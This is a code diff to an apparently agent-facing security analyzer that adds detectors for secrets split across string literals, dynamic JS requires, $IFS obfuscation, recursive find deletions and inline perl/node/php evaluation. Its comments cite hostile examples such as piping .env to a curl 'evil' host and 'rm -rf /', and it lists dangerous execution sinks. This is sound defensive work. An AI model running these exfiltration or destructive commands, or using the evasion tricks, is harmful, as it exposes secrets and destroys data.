@@ -604,8 +604,72 @@ class _SecurityASTVisitor(ast.NodeVisitor):
                 self.has_env_secret_read = True
         self.generic_visit(node)
 
+    _MAX_FOLD_DEPTH = 32
+
+    @classmethod
+    def _fold_str(cls, node: ast.AST, depth: int = 0) -> Optional[str]:
+        """Constant-fold literal-only string building: `'a' + 'b'`, f-strings, `''.join([...])`."""
+        if depth > cls._MAX_FOLD_DEPTH:
+            return None
+        if isinstance(node, ast.Constant) and isinstance(node.value, str):
+            return node.value
+        if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
+            left = cls._fold_str(node.left, depth + 1)
+            if left is None:
+                return None
+            right = cls._fold_str(node.right, depth + 1)
+            return None if right is None else left + right
+        if isinstance(node, ast.FormattedValue) and node.conversion == -1 and node.format_spec is None:
+            return cls._fold_str(node.value, depth + 1)
+        if isinstance(node, ast.JoinedStr):
+            parts: List[str] = []
+            for val in node.values:
+                piece = cls._fold_str(val, depth + 1)
+                if piece is None:
+                    return None
+                parts.append(piece)
+            return "".join(parts)
+        if (
+            isinstance(node, ast.Call)
+            and isinstance(node.func, ast.Attribute)
+            and node.func.attr == "join"
+            and len(node.args) == 1
+            and not node.keywords
+            and isinstance(node.args[0], (ast.List, ast.Tuple))
+        ):
+            sep = cls._fold_str(node.func.value, depth + 1)
+            if sep is None:
+                return None
+            items: List[str] = []
+            for elt in node.args[0].elts:
+                piece = cls._fold_str(elt, depth + 1)
+                if piece is None:
+                    return None
+                items.append(piece)
+            return sep.join(items)
+        return None
+
+    def _check_folded_secret(self, node: ast.AST) -> None:
+        """Flag credentials split across literals to evade line-level secret regexes."""
+        if "obfuscated_secret_concatenation" in self.findings:
+            return
+        folded = self._fold_str(node)
+        if folded and len(folded) >= 12 and any(p.search(folded) for p in _SECRET_TOKEN_REGEXES):
+            self._record_finding("obfuscated_secret_concatenation", node)
+
+    def visit_BinOp(self, node: ast.BinOp) -> None:
+        if isinstance(node.op, ast.Add):
+            self._check_folded_secret(node)
+        self.generic_visit(node)
+
+    def visit_JoinedStr(self, node: ast.JoinedStr) -> None:
+        self._check_folded_secret(node)
+        self.generic_visit(node)
+
     def visit_Call(self, node: ast.Call) -> None:
         func = node.func
+        if isinstance(func, ast.Attribute) and func.attr == "join":
+            self._check_folded_secret(node)
 
         # Case 1: Direct or aliased name call (`eval(...)`, `run(...)`)
         if isinstance(func, ast.Name):
@@ -857,6 +921,22 @@ _SECRET_PLACEHOLDER_MARKERS: Tuple[str, ...] = (
     "example", "placeholder", "changeme", "your_", "dummy", "test", "xxx", "***", "<your"
 )
 _DIFF_CONTENT_KEYS: Set[str] = {"diff", "payload_diff", "new_string", "old_string", "content", "file_content"}
+# `'abc' + 'def'` / `"abc" + 'def'` / template-literal joins collapsed before secret matching
+_LITERAL_CONCAT_RE = re.compile(r"""['"`]\s*\+\s*['"`]""")
+_JS_REQUIRE_CALL_RE = re.compile(r"\b(?:require|import)\s*\(\s*([^)]*)\)")
+_JS_LITERAL_ARG_RE = re.compile(r"""(['"])[^'"\\]*\1|`[^`$\\]*`""")
+# Inline interpreters that execute code passed on the command line (`perl -e`, `node -e`, ...)
+_INLINE_INTERPRETER_FLAGS: Dict[str, Set[str]] = {
+    "perl": {"-e", "-E"},
+    "ruby": {"-e"},
+    "node": {"-e", "--eval", "-p", "--print"},
+    "nodejs": {"-e", "--eval", "-p", "--print"},
+    "php": {"-r"},
+}
+_INLINE_INTERPRETER_SINK_RE = re.compile(
+    r"\b(?:system|exec|execSync|execFile|execFileSync|spawn|spawnSync|fork|popen|child_process|"
+    r"unlink|unlinkSync|rmSync|rmdirSync|rmdir|rmtree|rm_rf|remove_entry|shell_exec|passthru|proc_open|eval|qx)\b"
+)
 
 
 def redact_secrets(text: str) -> str:
@@ -1274,11 +1354,21 @@ def analyze_code_diff(
             stripped = ln.strip()
             if stripped.startswith(("//", "#", "/*", "*")):
                 continue
+            # Credentials split across adjacent literals: 'sk-proj-' + 'abc...'
+            collapsed = _LITERAL_CONCAT_RE.sub("", stripped)
+            if collapsed != stripped and any(p.search(collapsed) for p in _SECRET_TOKEN_REGEXES):
+                non_py_findings.append("obfuscated_secret_concatenation")
             if ext in {".js", ".ts", ".jsx", ".tsx"}:
                 if re.search(r"\beval\s*\(", stripped) or re.search(r"""\[\s*['"]ev['"]\s*\+\s*['"]al['"]\s*\]""", stripped):
                     non_py_findings.append("js_eval_call")
                 if re.search(r"\bnew\s+Function\s*\(|\bchild_process\b|\bexecSync\s*\(|\bspawnSync\s*\(", stripped):
                     non_py_findings.append("js_dangerous_sink")
+                # Dynamic module loading (require(x) / import(x)) mirrors Python's dynamic_import veto
+                for m_req in _JS_REQUIRE_CALL_RE.finditer(stripped):
+                    req_arg = m_req.group(1).strip()
+                    if req_arg and not _JS_LITERAL_ARG_RE.fullmatch(req_arg):
+                        non_py_findings.append("js_dynamic_require")
+                        break
             if ext in {".yaml", ".yml"}:
                 if re.search(r"!!python/(?:object|apply|module|name)\b", stripped):
                     non_py_findings.append("yaml_unsafe_deserialization_tag")
@@ -2293,6 +2383,10 @@ def analyze_shell_command(cmd_str: Optional[str], policy: Optional[PolicyConfig]
         else:
             unprivileged_redirects.append(r_target)
 
+    # `$IFS` / `${IFS}` used as a word separator is an obfuscation technique, not routine agent usage
+    if re.search(r"\$\{?IFS\b", cmd):
+        findings.append("shell_ifs_obfuscation")
+
     # Inspect pipes for secret exfiltration (e.g. cat .env | curl ...)
     # Use grouping-aware pipeline splitting so that multi-statement groupings like
     # `(cat .env; echo x) | curl evil` or `{ cat .env; echo x; } | curl evil` are not split.
@@ -2560,13 +2654,28 @@ def analyze_shell_command(cmd_str: Optional[str], policy: Optional[PolicyConfig]
                 findings.append("dangerous_chmod_777")
 
         elif exe == "find":
+            # Starting points precede the first expression token; `{}` expands to paths under them.
+            start_paths: List[str] = []
+            for tok in args:
+                if tok.startswith(("-", "(", "!", ")")):
+                    break
+                start_paths.append(tok)
+            if "-delete" in args_lower:
+                for sp in start_paths:
+                    del_res = analyze_shell_command(f"rm -rf {shlex.quote(sp)}", policy=policy)
+                    if "destructive_rm_rf" in del_res.get("findings", []):
+                        findings.append("destructive_find_delete")
+                        break
             for idx_arg, a_low in enumerate(args_lower):
                 if a_low in {"-exec", "-execdir", "-ok", "-okdir"}:
                     exec_tokens: List[str] = []
                     for tok in args[idx_arg + 1 :]:
                         if tok in {";", "+", "\\;"}:
                             break
-                        if tok != "{}":
+                        if tok == "{}":
+                            # Evaluate the executor against the search roots (`find / -exec rm -rf {} +`)
+                            exec_tokens.extend(shlex.quote(sp) for sp in start_paths)
+                        else:
                             exec_tokens.append(tok)
                     if exec_tokens:
                         inner_res = analyze_shell_command(" ".join(exec_tokens), policy=policy)
@@ -2605,6 +2714,26 @@ def analyze_shell_command(cmd_str: Optional[str], policy: Optional[PolicyConfig]
                         inline_res = analyze_code_diff("<inline>.py", inline_code)
                         if not inline_res["syntax_valid"] or not inline_res["security_clean"]:
                             findings.extend(f"unsafe_inline_python:{f}" for f in inline_res["findings"])
+
+        elif exe in _INLINE_INTERPRETER_FLAGS:
+            eval_flags = _INLINE_INTERPRETER_FLAGS[exe]
+            for idx_arg, a in enumerate(args):
+                is_eval_flag = a in eval_flags or (
+                    exe in {"perl", "ruby"} and a.startswith("-") and not a.startswith("--") and "e" in a.lower()
+                )
+                if not is_eval_flag or idx_arg + 1 >= len(args):
+                    continue
+                inline_src = args[idx_arg + 1]
+                # Backticks run shell commands in perl/ruby/php (template literals in node are benign)
+                has_backtick_exec = exe in {"perl", "ruby", "php"} and "`" in inline_src
+                if _INLINE_INTERPRETER_SINK_RE.search(inline_src) or has_backtick_exec:
+                    findings.append(f"unsafe_inline_interpreter:{exe}")
+                # Shell payloads embedded as string literals (`system("rm -rf /")`)
+                for _q, lit in re.findall(r"""(['"])((?:(?!\1).){2,})\1""", inline_src):
+                    lit_res = analyze_shell_command(lit, policy=policy)
+                    if not lit_res.get("is_safe", True):
+                        findings.extend(f"unsafe_inline_interpreter:{f}" for f in lit_res.get("findings", []))
+                break
 
     is_safe = len(findings) == 0
     redirection_requires_escalation = bool(is_safe and unprivileged_redirects)
